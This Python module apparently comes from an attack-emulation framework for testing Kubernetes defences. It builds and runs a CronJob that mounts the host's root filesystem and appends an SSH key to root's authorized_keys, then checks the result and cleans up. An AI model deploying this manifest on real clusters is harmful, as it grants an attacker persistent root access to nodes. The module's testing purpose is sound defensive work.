from testing.testing import Testing
import time

class KubernetesCronJob(Testing):
    def __init__(self):
        super().__init__()
        self.name = "Kubernetes CronJob"
        self.mitre_tactic = "TA0003"
        self.mitre_technique = "T1611"
        self.microsoft_technique = "MS-TA9013"
        self.pod = {
            "apiVersion": "batch/v1",
            "kind": "CronJob",
            "metadata": {
                "name": "ssh-inject-cronjob"
            },
            "spec": {
                "schedule": "*/1 * * * *",
                "jobTemplate": {
                    "spec": {
                        "template": {
                            "spec": {
                                "containers": [
                                    {
                                        "name": "evil",
                                        "image": "ubuntu",
                                        "command": ["/bin/sh", "-c", "mkdir -p /host/root/.ssh && echo 'ssh-rsa AAAAB3NzaC1y...Cukwfwh+iSTP' >> /host/root/.ssh/authorized_keys"],
                                        "volumeMounts": [
                                            {
                                                "name": "host",
                                                "mountPath": "/host"
                                            }
                                        ]
                                    }
                                ],
                                "volumes": [
                                    {
                                        "name": "host",
                                        "hostPath": {
                                            "path": "/"
                                        }
                                    }
                                ],
                                "restartPolicy": "Never"
                            }
                        }
                    }
                }
            }
        }

    def run_attack(self):
        if self.check_install_kubectl():
            # Creating Pod ssh-inject-cronjob
            print("# Creating Pod ssh-inject-cronjob...")
            self.kubectl_create_file("ssh-inject-cronjob.yaml", self.pod)
            self.kubectl_apply("ssh-inject-cronjob.yaml", add_command= True)

            print("\n# Waiting for the CronJob to write ssh-key in /root/.ssh/authorized_keys...")
            while not self.kubectl_is_cronjob_ready("ssh-inject-cronjob"):
                time.sleep(1)
            
            print("root@near-dev:/# sudo cat /root/.ssh/authorized_keys")
            output, error = self.cat_folder("/root/.ssh/authorized_keys")
            print(output)
            

            if self.error:
                print("An Error has occured: " + error)
            else:
                self.output["sudo cat /root/.ssh/authorized_keys"] = output
            
            
            # Cleanup
            self.cleanup()

    def cleanup(self):
        # Delete Pod ssh-inject-cronjob
        print("\n# Deleting Pod ssh-inject-cronjob...")
        self.kubectl_delete("ssh-inject-cronjob", "cronjob")
        
        print("\n# Deleting ssh-inject-cronjob.yaml...")
        self.delete_file("ssh-inject-cronjob.yaml")

    def display_help(self):
        pass

    def check_prerequisites(self):
        pass

    def determine_executable_path(self):
        pass